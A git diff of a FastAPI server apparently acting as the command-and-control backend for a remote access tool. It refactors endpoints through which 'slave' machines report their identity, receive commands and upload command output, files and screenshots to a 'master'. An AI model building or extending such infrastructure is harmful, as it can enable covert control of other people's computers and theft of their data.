@@ -1,46 +1,35 @@
 from typing import Annotated
 import os
 import json
-import shutil
 from fastapi import FastAPI, Request, UploadFile
-from models import SlaveCommandRequest
+from models import SlaveCommandRequest, SlaveTextOutputRequest, MasterCommandRequest
 from fastapi.responses import FileResponse
 import redisutil
+import service as Service
+import time
+
 app = FastAPI()
 
 
 @app.get("/")
-async def root(request: Request):
-    client_host = request.client.host
-    return {"client_host": client_host}
+async def root():
+    return "HELLO WORLD"
     
 @app.post("/api/slave/command")
-async def command(request: Request, slaveCommand: SlaveCommandRequest):
-    resp = {
-        "ip": request.client.host,
-        "username": slaveCommand.username,
-        "mac": slaveCommand.mac,
-        "hostname": slaveCommand.hostname,
-        "os": slaveCommand.os,
-    }
-    key = f"INFO_{slaveCommand.mac}"
-    redisutil.set_key_val(key,"KELLO")
-    return resp
+async def command(request: Request, slave_command: SlaveCommandRequest):
+    return Service.get_slave_command(request,slave_command)
     
-@app.get("/api/slave/response/text")
-async def textresponse():
-    return {"message": "Slave Text Response"}
+@app.post("/api/slave/response/text")
+async def textresponse(slave_text_op_req : SlaveTextOutputRequest):
+    return Service.set_slave_command_output(slave_text_op_req)
     
 @app.post("/api/slave/response/file")
-async def fileresponse(file: UploadFile):
-    return {"name": file.filename, "size": file.size}
+async def fileresponse(mac: str, file: UploadFile):
+    return Service.save_slave_file_upload(mac,file)
 
 @app.post("/api/slave/response/screenshot")
 async def screenshotresponse(file: UploadFile):
-    full_file_path = os.getcwd()+"/screenshot.png"
-    with open(full_file_path,"wb") as buffer:
-        shutil.copyfileobj(file.file,buffer)
-    return {"name": file.filename, "size": file.size}
+    return Service.save_screenshot_from_slave(file)
 
 @app.get("/api/master/screenshot")
 async def screenshotdownload():
@@ -48,30 +37,16 @@ async def screenshotdownload():
 
 @app.get("/api/master/slaves")
 async def listallslaves():
-    slaves_list= []
+    return Service.list_all_slaves()
+
+@app.post("/api/master/slave/command")
+async def master_command(master_command: MasterCommandRequest):
+    return Service.set_command_to_slave_from_master(master_command)
+
+@app.post("/api/master/slave/response")
+async def master_response(mac: str):
+    return Service.get_response_from_slave_to_master(mac)
     
-    slaves = redisutil.find_all_keys_with_pattern("INFO")
-    
-    if slaves is None:
-        return slaves_list
-    
-    for slave_key in slaves:
-        value = redisutil.get_value_from_key(str(slave_key))
-        print(f"SLAVE KEY is {slave_key} VALUE is {value}")
-        slaves_list.append(value)
-    
-    return slaves_list
-    
-@app.get("/api/master/slaves/deleteall")
-async def delallslaves():
-    slaves_list= []
-    
-    slaves = redisutil.find_all_keys_with_pattern("INFO")
-    
-    if slaves is None:
-        return slaves_list
-    
-    for slave_key in slaves:
-        redisutil.delete_key(slave_key)
-    
-    return "Done"
+@app.get("/api/redis/reset")
+async def clearredis():
+    return Service.clear_redis()
